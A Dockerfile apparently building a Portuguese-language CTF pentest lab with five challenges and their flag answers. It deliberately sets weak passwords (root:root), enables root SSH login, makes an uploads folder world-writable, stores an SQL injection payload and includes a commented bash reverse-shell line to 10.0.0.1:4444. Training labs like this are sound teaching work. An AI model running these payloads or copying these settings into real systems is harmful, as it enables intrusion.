FROM debian:12-slim

LABEL maintainer="CTF SENAI"
LABEL description="CenÃ¡rio Pentest - 5 Desafios"

# Instalar ferramentas
RUN apt-get update && apt-get install -y \
    openssh-server \
    apache2 \
    netcat-traditional \
    nmap \
    sudo \
    file \
    && rm -rf /var/lib/apt/lists/*

# Configurar SSH
RUN mkdir -p /var/run/sshd
RUN echo 'root:root' | chpasswd
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Criar usuÃ¡rio vulnerÃ¡vel
RUN useradd -m -s /bin/bash ctfuser
RUN echo 'ctfuser:123456' | chpasswd

# ==================== DESAFIO 1: Weak Password ====================
# Flag: W34K_P4SSW0RD
RUN echo "W34K_P4SSW0RD" > /home/ctfuser/flag.txt
RUN chown ctfuser:ctfuser /home/ctfuser/flag.txt
RUN chmod 600 /home/ctfuser/flag.txt
RUN echo "=== DESAFIO 1: Weak Password ===" > /root/README.txt
RUN echo "Existe um usuÃ¡rio 'ctfuser' com senha fraca." >> /root/README.txt
RUN echo "Descubra a senha e acesse o arquivo flag." >> /root/README.txt
RUN echo "" >> /root/README.txt

# ==================== DESAFIO 2: Port Scanning ====================
# Flag: P0RT_SC4NN3R
RUN mkdir -p /root/pentest
RUN echo "P0RT_SC4NN3R" > /root/pentest/scan_flag.txt
RUN echo "=== DESAFIO 2: Port Scanning ===" >> /root/README.txt
RUN echo "FaÃ§a um scan de portas e identifique todos os serviÃ§os rodando." >> /root/README.txt
RUN echo "Flag em: /root/pentest/scan_flag.txt" >> /root/README.txt
RUN echo "" >> /root/README.txt

# ==================== DESAFIO 3: File Upload Vuln ====================
# Flag: UPL04D_VULN
RUN mkdir -p /var/www/html/uploads
RUN chmod 777 /var/www/html/uploads
RUN echo "UPL04D_VULN" > /var/www/html/uploads/flag.txt
RUN echo "=== DESAFIO 3: File Upload Vulnerability ===" >> /root/README.txt
RUN echo "Encontre o diretÃ³rio de uploads com permissÃµes inseguras (777)." >> /root/README.txt
RUN echo "" >> /root/README.txt

# ==================== DESAFIO 4: SQL Injection ====================
# Flag: SQL1_M4ST3R
RUN echo "' OR '1'='1" > /root/pentest/sqli_payload.txt
RUN echo "SQL1_M4ST3R" > /root/pentest/sqli_flag.txt
RUN echo "=== DESAFIO 4: SQL Injection ===" >> /root/README.txt
RUN echo "Veja o payload de SQL Injection em /root/pentest/sqli_payload.txt" >> /root/README.txt
RUN echo "Flag em: /root/pentest/sqli_flag.txt" >> /root/README.txt
RUN echo "" >> /root/README.txt

# ==================== DESAFIO 5: Reverse Shell ====================
# Flag: R3V3RS3_SH3LL
RUN echo '#!/bin/bash' > /root/pentest/revshell.sh
RUN echo '# Reverse Shell Example' >> /root/pentest/revshell.sh
RUN echo '# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /root/pentest/revshell.sh
RUN echo '# Flag: R3V3RS3_SH3LL' >> /root/pentest/revshell.sh
RUN chmod +x /root/pentest/revshell.sh
RUN echo "R3V3RS3_SH3LL" > /root/pentest/revshell_flag.txt
RUN echo "=== DESAFIO 5: Reverse Shell ===" >> /root/README.txt
RUN echo "Analise o script de reverse shell em /root/pentest/revshell.sh" >> /root/README.txt
RUN echo "" >> /root/README.txt

# Banner
RUN echo '#!/bin/bash' > /etc/profile.d/welcome.sh
RUN echo 'clear' >> /etc/profile.d/welcome.sh
RUN echo 'echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"' >> /etc/profile.d/welcome.sh
RUN echo 'echo "â•‘     ðŸŽ¯ CTF SENAI - Pentest                              â•‘"' >> /etc/profile.d/welcome.sh
RUN echo 'echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"' >> /etc/profile.d/welcome.sh
RUN echo 'echo ""' >> /etc/profile.d/welcome.sh
RUN echo 'echo "ðŸ“‹ Desafios: 5 flags para capturar"' >> /etc/profile.d/welcome.sh
RUN echo 'echo "ðŸ“– Leia: cat /root/README.txt"' >> /etc/profile.d/welcome.sh
RUN echo 'echo ""' >> /etc/profile.d/welcome.sh
RUN chmod +x /etc/profile.d/welcome.sh

# Script de inicializaÃ§Ã£o
RUN echo '#!/bin/bash' > /start.sh
RUN echo 'service apache2 start' >> /start.sh
RUN echo '/usr/sbin/sshd -D' >> /start.sh
RUN chmod +x /start.sh

EXPOSE 22 80

CMD ["/start.sh"]
